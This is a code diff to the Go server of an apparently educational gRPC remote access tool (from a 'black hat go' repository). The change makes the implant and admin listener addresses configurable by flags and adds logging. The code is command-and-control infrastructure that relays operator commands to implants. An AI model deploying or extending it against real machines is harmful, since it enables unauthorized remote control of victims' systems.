@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"flag"
 
 	"github.com/rainer37/go-fun/grpc-rat-black-hat-go/grpcapi"
 	log "github.com/sirupsen/logrus"
@@ -16,6 +17,11 @@ type implantServer struct {
 type adminServer struct {
 	work, output chan *grpcapi.Command
 }
+
+var (
+	implantAddr string
+	adminAddr string
+)
 
 func NewImplantServer(work, out chan *grpcapi.Command) *implantServer {
 	s := new(implantServer)
@@ -61,21 +67,29 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 	return cmd, nil
 }
 
+func init()  {
+	flag.StringVar(&implantAddr, "implantAddr", "localhost:4444", "addr:port listens for implant server")
+	flag.StringVar(&adminAddr, "adminAddr", "localhost:9000", "addr:port listens for admin server")
+	flag.Parse()
+}
+
 func main()  {
 	var opts []grpc.ServerOption
 	work, output := make(chan *grpcapi.Command), make(chan *grpcapi.Command)
 	implant := NewImplantServer(work, output)
 	admin := NewAdminServer(work, output)
 
-	implantListener, err := net.Listen("tcp", "localhost:4444")
+	implantListener, err := net.Listen("tcp", implantAddr)
 	if err != nil {
 		log.Fatalln(err)
 	}
+	log.Info("Implant server on ", implantAddr)
 
-	adminListener, err := net.Listen("tcp", "localhost:9000")
+	adminListener, err := net.Listen("tcp", adminAddr)
 	if err != nil {
 		log.Fatalln(err)
 	}
+	log.Info("Admin server on ", adminAddr)
 
 	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
 	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
